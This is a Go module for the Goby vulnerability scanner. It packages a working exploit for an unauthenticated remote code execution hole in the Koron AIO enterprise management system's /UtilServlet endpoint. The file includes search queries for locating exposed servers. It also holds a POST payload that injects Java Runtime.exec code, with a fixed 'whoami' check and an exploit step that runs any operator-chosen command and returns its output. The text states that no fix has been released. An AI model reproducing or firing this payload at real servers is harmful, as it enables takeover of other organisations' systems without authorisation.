package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Koron AIO management system /UtilServlet Code Execution Vulnerability",
    "Description": "<p>Koron AIO management system is a comprehensive enterprise management software designed to provide enterprises with comprehensive management solutions. The system integrates a variety of functional modules, including but not limited to human resource management, financial management, supply chain management, customer relationship management, etc., to help enterprises efficiently manage all aspects of business activities.</p><p>There is a front-end remote command execution vulnerability in the Koron AIO management system, which is caused by remote code execution caused by controllable value, and the attacker controls the remote system by executing malicious code, which may lead to a complete takeover of the system and cause serious security risks.</p>",
    "Product": "Cooperation-AIO-MS",
    "Homepage": "http://www.koronsoft.com/col.jsp?id=136",
    "DisclosureDate": "2024-03-22",
    "PostTime": "2024-03-22",
    "Author": "2974057526@qq.com",
    "FofaQuery": "body=\"changeAccount(varAccount)\" || body=\"KoronCom.TrustedSites\"",
    "GobyQuery": "body=\"changeAccount(varAccount)\" || body=\"KoronCom.TrustedSites\"",
    "Level": "2",
    "Impact": "<p>There is a front-end remote command execution vulnerability in the Koron AIO management system, which is caused by remote code execution caused by controllable value, and the attacker controls the remote system by executing malicious code, which may lead to a complete takeover of the system and cause serious security risks.</p>",
    "Recommendation": "<p>At present, the official version has not been released, and users are advised to pay attention to the official website dynamics: <a href=\"http://www.example.com\">http://www.koronsoft.com/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/UtilServlet",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Content-Length": "278"
                },
                "data_type": "text",
                "data": "operation=calculate&value=BufferedReader br=new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"whoami\").getInputStream()));String line=null;StringBuffer b=new StringBuffer();while((line=br.readLine())!=null){b.append(line%2b\"\\n\");}b.toString();&fieldName=_1"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "nt",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/UtilServlet"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/UtilServlet",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Content-Length": "278"
                },
                "data_type": "text",
                "data": "operation=calculate&value=BufferedReader br=new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"{{{cmd}}}\").getInputStream()));String line=null;StringBuffer b=new StringBuffer();while((line=br.readLine())!=null){b.append(line%2b\"\\n\");}b.toString();&fieldName=_1"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "HW-2023",
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "科荣AIO管理系统 /UtilServlet 代码执行漏洞",
            "Product": "科荣AIO管理系统",
            "Description": "<p>科荣AIO管理系统是一款综合性的企业管理软件，旨在为企业提供全面的管理解决方案。该系统整合了多种功能模块，包括但不限于人力资源管理、财务管理、供应链管理、客户关系管理等，以帮助企业高效地管理各个方面的业务活动。</p><p>科荣AIO管理系统存在前台远程命令执行漏洞，其产生原因是value可控导致的远程代码执行，攻击者通过执行恶意代码来控制远程系统，这可能导致系统被完全接管，造成严重的安全风险。</p>",
            "Recommendation": "<p>目前官方暂未发布修复版本，建议用户关注官网动态：<a href=\"http://www.koronsoft.com/\">http://www.koronsoft.com/</a></p>",
            "Impact": "<p>科荣AIO管理系统存在前台远程命令执行漏洞，其产生原因是value可控导致的远程代码执行，攻击者通过执行恶意代码来控制远程系统，这可能导致系统被完全接管，造成严重的安全风险。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "HW-2023",
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Koron AIO management system /UtilServlet Code Execution Vulnerability",
            "Product": "Cooperation-AIO-MS",
            "Description": "<p>Koron AIO management system is a comprehensive enterprise management software designed to provide enterprises with comprehensive management solutions. The system integrates a variety of functional modules, including but not limited to human resource management, financial management, supply chain management, customer relationship management, etc., to help enterprises efficiently manage all aspects of business activities.<br></p><p>There is a front-end remote command execution vulnerability in the <span style=\"color: rgba(255, 255, 255, 0.87); font-size: 16px;\">Koron&nbsp;</span>AIO management system, which is caused by remote code execution caused by controllable value, and the attacker controls the remote system by executing malicious code, which may lead to a complete takeover of the system and cause serious security risks.<br></p>",
            "Recommendation": "<p>At present, the official version has not been released, and users are advised to pay attention to the official website dynamics: <a href=\"http://www.example.com\" target=\"_blank\">http://www.koronsoft.com/</a><br></p>",
            "Impact": "<p><span style=\"color: rgba(255, 255, 255, 0.87); font-size: 16px;\">There is a front-end remote command execution vulnerability in the&nbsp;</span><span style=\"color: rgba(255, 255, 255, 0.87); font-size: 16px;\">Koron&nbsp;</span><span style=\"color: rgba(255, 255, 255, 0.87); font-size: 16px;\">AIO management system, which is caused by remote code execution caused by controllable value, and the attacker controls the remote system by executing malicious code, which may lead to a complete takeover of the system and cause serious security risks.</span><br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "HW-2023",
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10967"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
